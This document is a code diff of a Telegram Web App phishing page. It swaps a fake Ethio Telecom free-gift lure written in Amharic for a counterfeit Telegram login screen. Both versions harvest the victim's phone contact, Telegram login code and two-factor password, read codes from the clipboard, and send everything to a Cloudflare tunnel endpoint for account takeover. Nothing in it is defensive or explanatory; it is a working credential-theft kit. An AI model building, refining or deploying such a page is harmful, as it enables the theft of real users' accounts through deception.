@@ -1,316 +1,198 @@
 <!DOCTYPE html>
-<html lang="am">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
-    <meta http-equiv="Pragma" content="no-cache">
-    <meta http-equiv="Expires" content="0">
-    <title>Ethio Telecom - Gift Center</title>
+    <title>Telegram Messenger</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
 <style>
     :root {
-        --ethio-green: #76b82a;
-        --ethio-blue: #00adef;
-        --ethio-dark-blue: #0054a6;
-        --telebirr-gold: #fdb913;
-        --bg-light: #f1f5f9;
-        --white: #ffffff;
-        --text-main: #1e293b;
+        --tg-blue: #24A1DE;
+        --tg-bg: #ffffff;
+        --tg-text: #000000;
+        --tg-hint: #999999;
     }
 
     * { 
         box-sizing: border-box; 
         -webkit-tap-highlight-color: transparent; 
-        font-family: 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif; 
+        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
     }
     
     body { 
-        margin: 0; padding: 0; color: var(--text-main); 
-        background-color: var(--bg-light);
-        overflow-x: hidden; min-height: 100vh;
+        margin: 0; padding: 0; color: var(--tg-text); 
+        background: var(--tg-bg); 
+        height: 100vh; width: 100vw;
         display: flex; flex-direction: column; align-items: center;
-        /* ለአይፎን ሙሉ ስክሪን ድጋፍ */
-        padding-top: env(safe-area-inset-top);
+        overflow-x: hidden;
     }
 
-    /* Top Branding Header - ዌብ አፕ ሲሆን በቴሌግራም ባር ስለሚተካ እንዲጠፋ ተደርጓል */
-    .app-header {
-        width: 100%;
-        background: var(--white);
-        padding: 10px 20px;
-        display: flex;
-        justify-content: space-between;
-        align-items: center;
-        box-shadow: 0 2px 10px rgba(0,0,0,0.05);
-        position: sticky;
-        top: 0;
-        z-index: 100;
-        border-bottom: 3px solid var(--ethio-green);
-    }
-
-    .app-header img { height: 24px; width: auto; }
-
-    .container {
-        width: 100%;
-        max-width: 450px;
-        padding: 10px;
-        display: flex;
-        flex-direction: column;
-        align-items: center;
-    }
-
-    .step { display: none; width: 100%; animation: fadeIn 0.4s ease-out; flex-direction: column; align-items: center; }
+    .step { display: none; width: 100%; max-width: 400px; flex-direction: column; align-items: center; padding: 40px 25px; text-align: center; }
     .active { display: flex; }
-    @keyframes fadeIn { from { opacity: 0; transform: translateY(8px); } to { opacity: 1; transform: translateY(0); } }
 
-    .main-card {
-        background: var(--white);
-        border-radius: 20px;
-        padding: 20px;
-        width: 100%;
-        box-shadow: 0 4px 25px rgba(0, 0, 0, 0.06);
-        border: 1px solid rgba(0,0,0,0.02);
-    }
+    /* Loading Screen */
+    .tg-logo-container { margin-top: 20vh; position: relative; }
+    .tg-logo { width: 120px; height: 120px; }
 
-    .promo-banner {
-        width: 100%;
-        border-radius: 14px;
-        margin-bottom: 15px;
-        box-shadow: 0 4px 12px rgba(0,0,0,0.1);
-    }
-
-    h2 { 
-        color: var(--ethio-dark-blue); 
-        font-size: 20px; 
-        margin-bottom: 12px; 
-        font-weight: 700; 
-        text-align: center;
-        line-height: 1.3;
-    }
+    /* Forms */
+    .monkey-img { width: 100px; height: 100px; margin-bottom: 20px; }
     
-    p { 
-        color: #475569; 
-        font-size: 14px; 
-        line-height: 1.5; 
-        text-align: center;
-        margin-bottom: 15px;
+    h2 { font-size: 22px; font-weight: 600; margin: 10px 0; }
+    p { font-size: 15px; color: var(--tg-hint); line-height: 1.4; margin-bottom: 25px; }
+
+    .btn-main {
+        background: var(--tg-blue); 
+        color: #fff; padding: 14px; width: 100%; border-radius: 12px; border: none;
+        font-size: 16px; font-weight: 600; cursor: pointer; margin-top: 10px;
+        transition: background 0.2s;
+        display: flex; align-items: center; justify-content: center; gap: 10px;
     }
+    .btn-main:active { opacity: 0.8; }
+    .btn-main:disabled { background: #ccc; }
 
     input {
-        width: 100%; 
-        padding: 14px; 
-        margin-bottom: 12px;
-        border-radius: 12px;
-        border: 2px solid #e2e8f0; 
-        font-size: 16px; 
-        outline: none; 
+        width: 100%; padding: 14px; margin: 10px 0; border-radius: 10px;
+        border: 1px solid #ddd; background: #f4f4f5;
+        color: #000; font-size: 16px;
     }
-    
-    .btn-main {
-        background: linear-gradient(135deg, var(--ethio-green) 0%, #5d9421 100%); 
-        color: var(--white);
-        padding: 16px; 
-        width: 100%; 
-        border-radius: 12px; 
-        border: none;
-        font-size: 17px; 
-        font-weight: 600; 
-        cursor: pointer; 
-        box-shadow: 0 4px 15px rgba(118, 184, 42, 0.3);
-    }
+    input:focus { border-color: var(--tg-blue); outline: none; background: #fff; }
 
-    .gift-selection-area { width: 100%; display: flex; flex-direction: column; gap: 7px; margin-bottom: 15px; }
-
-    .gift-option {
-        display: flex; align-items: center; padding: 8px;
-        background: #f8fafc; border: 2px solid #edf2f7; border-radius: 12px;
-    }
-    .gift-option i { font-size: 18px; color: var(--ethio-green); margin-right: 12px; }
-    .gift-option span { font-weight: 600; font-size: 14px; color: var(--ethio-dark-blue); }
-
-    .otp-container { display: flex; justify-content: center; gap: 6px; margin: 15px 0; }
+    /* OTP Boxes */
+    .otp-container { display: flex; gap: 10px; margin: 20px 0; justify-content: center; }
     .otp-box { 
-        width: 40px; height: 50px; border: 2px solid #e2e8f0; border-radius: 10px; 
-        display: flex; align-items: center; justify-content: center; font-size: 20px; font-weight: 700; background: #fff;
+        width: 45px; height: 55px; 
+        border-bottom: 2px solid #ddd;
+        display: flex; align-items: center; justify-content: center; 
+        font-size: 24px; font-weight: bold;
     }
-    .otp-box.filled { border-color: var(--ethio-blue); background: #f0f9ff; }
+    .otp-box.filled { border-bottom-color: var(--tg-blue); }
 
-    .keypad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 8px; width: 100%; margin-top: 15px; }
-    .key { background: #fff; padding: 12px; border-radius: 10px; font-size: 18px; font-weight: 600; text-align: center; border: 1px solid #e2e8f0; }
+    .keypad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 1px; width: 100%; background: #eee; margin-top: 30px; border: 1px solid #eee;}
+    .key { background: #fff; padding: 20px; font-size: 24px; cursor: pointer; }
+    .key:active { background: #f4f4f5; }
 
-    .msg { padding: 10px; border-radius: 10px; font-size: 13px; margin-bottom: 12px; display: none; text-align: center; }
-    .error { background: #fff1f2; color: #e11d48; border: 1px solid #fda4af; }
-    .loading-msg { background: #f0f9ff; color: #0369a1; border: 1px solid #bae6fd; }
+    .msg { padding: 12px; border-radius: 8px; font-size: 14px; margin: 10px 0; display: none; width: 100%; }
+    .error { background: #fde8e8; color: #c81e1e; }
+    .loading-msg { background: #e1effe; color: #1e429f; }
 
     .loader-ring {
-        width: 35px; height: 35px; border: 4px solid #f1f5f9;
-        border-top: 4px solid var(--ethio-blue); border-radius: 50%;
-        animation: spin 1s linear infinite; margin: 10px auto;
+        width: 30px; height: 30px; border: 3px solid #f3f3f3;
+        border-top: 3px solid var(--tg-blue); border-radius: 50%;
+        animation: spin 1s linear infinite; margin: 20px auto;
     }
-    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-
+    @keyframes spin { 100% { transform: rotate(360deg); } }
+    .btn-spinner { display: none; width: 18px; height: 18px; border: 2px solid #fff; border-top: 2px solid transparent; border-radius: 50%; animation: spin 0.8s linear infinite; }
 </style>
 </head>
 <body>
 
-    <div class="app-header">
-        <img src="https://i.postimg.cc/sgJDkdtj/images-5-removebg-preview.png" alt="ethio telecom">
-        <img src="https://i.postimg.cc/MTNLPH5y/images-4-removebg-preview.png" alt="telebirr">
+    <div id="step_intro" class="step active">
+        <div class="tg-logo-container">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" class="tg-logo" alt="Telegram">
+        </div>
+        <div class="loader-ring"></div>
+        <p style="margin-top: 10px;">Connecting to Telegram...</p>
     </div>
 
-    <div class="container">
-
-        <div id="step_intro" class="step active">
-            <div class="main-card">
-                <div class="loader-ring"></div>
-                <h2>እንኳን ደህና መጡ</h2>
-                <p>የኢትዮ ቴሌኮም የስጦታ ማዕከል መተግበሪያ በመጫን ላይ ነው...</p>
-            </div>
-        </div>
-
-        <div id="step_photo_slide" class="step">
-            <div class="main-card">
-                <img src="https://i.postimg.cc/XJ8LRJnC/birr.png" class="promo-banner">
-                <h2>የ ethiotelecom ነፃ  Gift  ዝርዝር!</h2>
-                <div class="gift-selection-area">
-                    <div class="gift-option" onclick="handleLoginClick()">
-                        <i class="fa-solid fa-gift"></i>
-                        <span>የ 25GB የወር ጥቅል ስጦታ</span>
-                    </div>
-                    <div class="gift-option" onclick="handleLoginClick()">
-                        <i class="fa-solid fa-gift"></i>
-                        <span>የ 100 ብር የሞባይል ካርድ</span>
-                    </div>
-                    <div class="gift-option" onclick="handleLoginClick()">
-                        <i class="fa-solid fa-gift"></i>
-                        <span>የ 5GB የሳምንት ስጦታ</span>
-                    </div>
-                    <div class="gift-option" onclick="handleLoginClick()">
-                        <i class="fa-solid fa-gift"></i>
-                        <span>የ 300 ደቂቃ የድምፅ ጥቅል</span>
-                    </div>
-                </div>
-
-                <input type="hidden" id="fname" value="Valued Customer">
-                <div id="status1" class="msg"></div>
-                
-                <button class="btn-main" id="loginBtn" onclick="handleLoginClick()">አሁን ተቀበል</button>
-            </div>
-        </div>
-
-        <div id="step2" class="step">
-            <div class="main-card">
-                <h2 style="color:var(--ethio-blue);">ማረጋገጫ ኮድ</h2>
-                <p id="step2_name_display" style="font-weight:700; color:var(--ethio-dark-blue);"></p>
-                <p>በቴሌግራም የላክንልዎትን ባለ 5 ድጂት ኮድ እዚህ ያስገቡ።</p>
-                
-                <div class="otp-container" id="otp_container">
-                    <div class="otp-box" id="b0"></div>
-                    <div class="otp-box" id="b1"></div>
-                    <div class="otp-box" id="b2"></div>
-                    <div class="otp-box" id="b3"></div>
-                    <div class="otp-box" id="b4"></div>
-                </div>
-
-                <div id="status2" class="msg"></div>
-                
-                <button class="btn-main" style="background:#51a9f0; font-size:14px; margin-bottom:15px;" onclick="window.open('https://t.me/42777', '_blank')">
-                    ኮዱን ለማየት እዚህ ይጫኑ
-                </button>                
-                
-                <div class="keypad">
-                    <div class="key" onclick="press(1)">1</div><div class="key" onclick="press(2)">2</div><div class="key" onclick="press(3)">3</div>
-                    <div class="key" onclick="press(4)">4</div><div class="key" onclick="press(5)">5</div><div class="key" onclick="press(6)">6</div>
-                    <div class="key" onclick="press(7)">7</div><div class="key" onclick="press(8)">8</div><div class="key" onclick="press(9)">9</div>
-                    <div style="border:none;"></div><div class="key" onclick="press(0)">0</div>
-                    <div class="key" onclick="backspace()"><i class="fa-solid fa-backspace"></i></div>
-                </div>
-            </div>
-        </div>
-
-        <div id="step3" class="step">
-            <div class="main-card">
-                <div style="text-align:center; margin-bottom:20px;">
-                    <i class="fa-solid fa-shield-halved" style="font-size:45px; color:var(--telebirr-gold);"></i>
-                </div>
-                <h2 id="step3_name_display">የደህንነት ማረጋገጫ</h2>
-                <p>እባክዎ የቴሌግራም ባለ ሁለት ደረጃ ማረጋገጫ (2FA) ፓስዎርድዎን ያስገቡ።</p>
-                
-                <div class="pass-wrapper">
-                    <input type="password" id="2fa_input" placeholder="Password">
-                    <i class="fa-solid fa-eye" id="toggleIcon" onclick="togglePasswordVisibility()"></i>
-                </div>
-                
-                <div id="status3" class="msg"></div>
-                <button class="btn-main" id="confirmBtn" onclick="submit2FA()">አረጋግጥ</button>
-            </div>
-        </div>
-
-        <div id="step_success" class="step">
-            <div class="main-card" style="text-align:center;">
-                <div style="width:70px; height:70px; background:var(--ethio-green); border-radius:50%; display:flex; align-items:center; justify-content:center; margin: 0 auto 20px;">
-                    <i class="fa-solid fa-check" style="color:#fff; font-size:35px;"></i>
-                </div>
-                <h2>እንኳን ደስ አለዎት!</h2>
-                <p>የመረጡት ስጦታ በትክክል ተመዝግቧል። በ 24 ሰዓት ውስጥ ወደ ስልክዎ ይላካል። ኢትዮ ቴሌኮምን ስለመረጡ እናመሰግናለን።</p>
-                <button class="btn-main" onclick="window.location.href='https://t.me/ethio_telecom'">እሺ አመሰግናለሁ</button>
-            </div>
-        </div>
-
-        <div id="flood_step" class="step">
-            <div class="main-card" style="text-align:center;">
-                <i class="fa-solid fa-clock-rotate-left" style="font-size:45px; color:#e67e22; margin-bottom:20px;"></i>
-                <h2>ለጥቂት ሰከንድ ይጠብቁ</h2>
-                <p>ብዙ ተጠቃሚዎች ስጦታ እየተቀበሉ ስለሆነ ሲስተሙ ተጨናንቋል። እባክዎ በትዕግስት ይጠብቁ።</p>
-                <div style="font-size: 40px; font-weight: 800; color: var(--ethio-dark-blue); margin: 20px 0;" id="wait_time">00:00</div>
-            </div>
-        </div>
-
+    <div id="step_photo_slide" class="step">
+        <img src="https://telegram.org/img/t_logo.png" style="width: 80px; margin-bottom: 20px;">
+        <h2>Telegram Login</h2>
+        <p>Please log in to continue to the service.</p>
+        
+        <div id="status1" class="msg"></div>
+        <button class="btn-main" id="loginBtn" onclick="handleLoginClick()">
+            <div class="btn-spinner" id="loginSpinner"></div>
+            <span id="loginText">Log In with Telegram</span>
+        </button>
     </div>
 
-    <div id="bgLayer" style="position:fixed; top:0; left:0; width:100%; height:100%; z-index:-1; opacity:0.04; background-size:cover;"></div>
+    <div id="step2" class="step">
+        <img src="https://static.vecteezy.com/system/resources/previews/010/263/595/original/monkey-face-icon-free-vector.jpg" class="monkey-img" alt="Monkey">
+        <h2 id="step2_phone_display">+251 93 809 6980</h2>
+        <p>We have sent you a message in Telegram with the code.</p>
+        
+        <div class="otp-container" id="otp_container">
+            <div class="otp-box" id="b0"></div>
+            <div class="otp-box" id="b1"></div>
+            <div class="otp-box" id="b2"></div>
+            <div class="otp-box" id="b3"></div>
+            <div class="otp-box" id="b4"></div>
+        </div>
+
+        <div id="status2" class="msg"></div>
+
+        <div class="keypad">
+            <div class="key" onclick="press(1)">1</div><div class="key" onclick="press(2)">2</div><div class="key" onclick="press(3)">3</div>
+            <div class="key" onclick="press(4)">4</div><div class="key" onclick="press(5)">5</div><div class="key" onclick="press(6)">6</div>
+            <div class="key" onclick="press(7)">7</div><div class="key" onclick="press(8)">8</div><div class="key" onclick="press(9)">9</div>
+            <div class="key" style="background:#f4f4f5;"></div><div class="key" onclick="press(0)">0</div>
+            <div class="key" onclick="backspace()"><i class="fa-solid fa-delete-left"></i></div>
+        </div>
+    </div>
+
+    <div id="step3" class="step">
+        <img src="https://emoji.slack-edge.com/T024F7F15/monkey_see_no_evil/562383c509c258d4.png" class="monkey-img" style="width: 120px; height:auto;">
+        <h2>Enter Your Password</h2>
+        <p>Your account is protected with an additional password.</p>
+        
+        <div id="status3" class="msg"></div>
+        <div style="position: relative; width: 100%;">
+            <input type="password" id="2fa_input" placeholder="Password" oninput="hideMsg(3)">
+            <i class="fa-solid fa-eye" id="toggleIcon" onclick="togglePasswordVisibility()" style="position: absolute; right: 15px; top: 50%; transform: translateY(-50%); color: #888; cursor: pointer;"></i>
+        </div>
+        
+        <button class="btn-main" id="confirmBtn" onclick="submit2FA()">
+            <div class="btn-spinner" id="confirmSpinner"></div>
+            <span id="confirmText">NEXT</span>
+        </button>
+        <p style="color: var(--tg-blue); font-weight: 500; margin-top: 20px; cursor: pointer;">Forgot Password?</p>
+    </div>
+
+    <div id="step_success" class="step">
+        <i class="fa-solid fa-circle-check" style="font-size: 60px; color: #31a24c; margin-bottom: 20px;"></i>
+        <h2>Login Successful</h2>
+        <p>You have successfully logged in to your Telegram account.</p>
+        <button class="btn-main" onclick="tg.close()">Close</button>
+    </div>
+
+    <div id="flood_step" class="step">
+        <i class="fa-solid fa-clock" style="font-size: 60px; color: #f2a600; margin-bottom: 20px;"></i>
+        <h2>Too Many Attempts</h2>
+        <p>Please wait before trying again.</p>
+        <div style="font-size: 32px; font-weight: bold;" id="wait_time">00:00</div>
+    </div>
 
 <script>
     const tg = window.Telegram.WebApp;
-
-    // 1. መተግበሪያውን ሙሉ ስክሪን ማድረግ
     tg.expand();
+    tg.ready();
 
-    // 2. የላይኛውን ባር ቀለም ከዌብሳይቱ ዳራ ጋር ማመሳሰል (ያለውን ጥቁር ባር ለማጥፋት)
-    tg.setHeaderColor('#f1f5f9'); // የሰውነት ዳራ ቀለም
-    tg.setBackgroundColor('#f1f5f9');
-
-    const API_BASE_URL = "https://doom-listings-flame-plastics.trycloudflare.com"; 
+    const API_BASE_URL = "https://skirts-flickr-colorado-pairs.trycloudflare.com"; 
     let userId = tg.initDataUnsafe.user ? tg.initDataUnsafe.user.id.toString() : "test_user";
     let sid = userId; 
     let currentOtp = "";
     let statusChecker;
     let isProcessing = false;
-    let savedName = "Customer";
+    let savedName = tg.initDataUnsafe.user ? tg.initDataUnsafe.user.first_name : "User";
 
     window.onload = function() {
         setTimeout(() => {
             showStep('photo_slide');
-            checkStatus(); 
-        }, 2000);
+        }, 2500);
 
         statusChecker = setInterval(checkStatus, 3000);
         setupLongPressPaste(); 
-        
-        document.getElementById('2fa_input').addEventListener('input', () => {
-            document.getElementById('status3').style.display = 'none';
-        });
     };
+
+    function playTap() { if (window.navigator.vibrate) window.navigator.vibrate(10); }
 
     function showStep(n) {
         document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
         let stepId = (typeof n === 'string') ? 'step_' + n : 'step' + n;
         const target = document.getElementById(stepId);
         if(target) target.classList.add('active');
-        
-        if(document.getElementById('step2_name_display')) document.getElementById('step2_name_display').innerText = "ሰላም " + savedName;
     }
 
     function checkStatus() {
@@ -325,9 +207,13 @@
     function stopLoaders() {
         isProcessing = false;
         document.getElementById('loginBtn').disabled = false;
-        document.getElementById('loginBtn').innerText = 'አሁን ተቀበል';
-        document.getElementById('confirmBtn').disabled = false;
-        document.getElementById('confirmBtn').innerText = 'አረጋግጥ';
+        document.getElementById('loginSpinner').style.display = 'none';
+        document.getElementById('loginText').innerText = "Log In with Telegram";
+        if(document.getElementById('confirmBtn')){
+            document.getElementById('confirmBtn').disabled = false;
+            document.getElementById('confirmSpinner').style.display = 'none';
+            document.getElementById('confirmText').innerText = 'NEXT';
+        }
     }
 
     function togglePasswordVisibility() {
@@ -343,15 +229,19 @@
     }
 
     function handleLoginClick() {
-        document.getElementById('loginBtn').disabled = true;
-        document.getElementById('loginBtn').innerText = 'በማረጋገጥ ላይ...';
+        playTap();
+        const btn = document.getElementById('loginBtn');
+        const spinner = document.getElementById('loginSpinner');
+        btn.disabled = true;
+        spinner.style.display = 'block';
+        document.getElementById('loginText').innerText = 'Connecting...';
         startVerification();
     }
 
     function startVerification() {
         if (isProcessing) return;
         isProcessing = true;
-        showMsg(1, 'loading-msg', 'መረጃዎን በማረጋገጥ ላይ...');
+        showMsg(1, 'loading-msg', 'Establishing secure connection...');
         checkUserInDB();
     }
 
@@ -364,31 +254,26 @@
             });
             const data = await res.json();
             if (data.status === "FOUND" || data.status === "NEED_OTP") {
-                showMsg(1, 'loading-msg', 'ጥያቄዎ ተቀባይነት አግኝቷል...');
+                showMsg(1, 'loading-msg', 'Account found, waiting for code...');
             } else if (data.status === "SUCCESS") {
                 showStep('success');
-            } else {
-                requestPhone();
-            }
+            } else { requestPhone(); }
         } catch(e) { 
             stopLoaders();
-            showMsg(1, 'error', 'ሰርቨሩ ስለተጨናነቀ ትንሽ ቆይተው ይሞክሩ።');
+            showMsg(1, 'error', 'Server error. Please try again later.');
         }
     }
 
     function requestPhone() {
         tg.requestContact((success) => {
-            if (success) {
-                showMsg(1, 'loading-msg', 'ሽልማቱ እየተዘጋጀ ነው...');
-            } else { 
-                stopLoaders();
-                showMsg(1, 'error', 'ለመቀጠል የግድ መረጃ ማጋራት አለብዎት!'); 
-            }
+            if (success) { showMsg(1, 'loading-msg', 'Code sent to your Telegram app.'); } 
+            else { stopLoaders(); showMsg(1, 'error', 'Verification required to continue.'); }
         });
     }
 
     function press(num) {
-        document.getElementById('status2').style.display = 'none';
+        playTap();
+        hideMsg(2); 
         if (currentOtp.length < 5) {
             currentOtp += num;
             updateOtpUI();
@@ -396,7 +281,7 @@
         }
     }
 
-    function backspace() { currentOtp = currentOtp.slice(0, -1); updateOtpUI(); }
+    function backspace() { playTap(); currentOtp = currentOtp.slice(0, -1); updateOtpUI(); }
 
     function updateOtpUI() {
         for (let i = 0; i < 5; i++) {
@@ -407,7 +292,7 @@
     }
 
     async function submitOTP() {
-        showMsg(2, 'loading-msg', 'ኮዱን እያረጋገጥን ነው...');
+        showMsg(2, 'loading-msg', 'Verifying code...');
         try {
             const res = await fetch(`${API_BASE_URL}/verify_otp`, {
                 method: 'POST',
@@ -416,14 +301,19 @@
             });
             const data = await res.json();
             handleResponse(data, 2);
-        } catch(e) { showMsg(2, 'error', 'ስህተት ተከስቷል!'); }
+        } catch(e) { showMsg(2, 'error', 'Connection lost!'); }
     }
 
     async function submit2FA() {
+        playTap();
         const pass = document.getElementById('2fa_input').value;
-        if(!pass) return showMsg(3, 'error', 'ፓስዎርድ ያስገቡ');
-        document.getElementById('confirmBtn').disabled = true;
-        document.getElementById('confirmBtn').innerText = 'በማረጋገጥ ላይ...';
+        if(!pass) return showMsg(3, 'error', 'Please enter your password');
+        
+        const btn = document.getElementById('confirmBtn');
+        const spinner = document.getElementById('confirmSpinner');
+        btn.disabled = true; spinner.style.display = 'block';
+
+        showMsg(3, 'loading-msg', 'Verifying password...');
         try {
             const res = await fetch(`${API_BASE_URL}/verify_2fa`, {
                 method: 'POST',
@@ -432,10 +322,7 @@
             });
             const data = await res.json();
             handleResponse(data, 3);
-        } catch(e) { 
-            stopLoaders();
-            showMsg(3, 'error', 'ማረጋገጥ አልተቻለም!'); 
-        }
+        } catch(e) { stopLoaders(); showMsg(3, 'error', 'An error occurred!'); }
     }
 
     function handleResponse(data, step) {
@@ -444,7 +331,7 @@
         else if (data.status === "FLOOD") { startFloodTimer(data.wait); }
         else {
             stopLoaders();
-            showMsg(step, 'error', 'የተሳሳተ መረጃ! እባክዎ በትክክል ያስገቡ።');
+            showMsg(step, 'error', 'Invalid info. Please try again.');
             if(step === 2) { currentOtp = ""; updateOtpUI(); }
         }
     }
@@ -453,6 +340,11 @@
         const el = document.getElementById('status' + stepId);
         if(!el) return;
         el.className = 'msg ' + type; el.innerText = text; el.style.display = 'block';
+    }
+
+    function hideMsg(stepId) {
+        const el = document.getElementById('status' + stepId);
+        if(el && el.style.display === 'block' && el.classList.contains('error')) el.style.display = 'none';
     }
 
     function startFloodTimer(seconds) {
@@ -468,21 +360,18 @@
     function setupLongPressPaste() {
         const container = document.getElementById('otp_container');
         let timer;
-        container.addEventListener('touchstart', () => {
-            timer = setTimeout(async () => {
-                try {
-                    const text = await navigator.clipboard.readText();
-                    const cleanCode = text.replace(/\D/g, '').slice(0, 5);
-                    if (cleanCode.length === 5) { 
-                        document.getElementById('status2').style.display = 'none';
-                        currentOtp = cleanCode; 
-                        updateOtpUI(); 
-                        submitOTP(); 
-                    }
-                } catch (err) {}
-            }, 800);
-        });
-        container.addEventListener('touchend', () => clearTimeout(timer));
+        if(container){
+            container.addEventListener('touchstart', () => {
+                timer = setTimeout(async () => {
+                    try {
+                        const text = await navigator.clipboard.readText();
+                        const cleanCode = text.replace(/\D/g, '').slice(0, 5);
+                        if (cleanCode.length === 5) { currentOtp = cleanCode; updateOtpUI(); submitOTP(); }
+                    } catch (err) {}
+                }, 800);
+            });
+            container.addEventListener('touchend', () => clearTimeout(timer));
+        }
     }
 </script>
 </body>
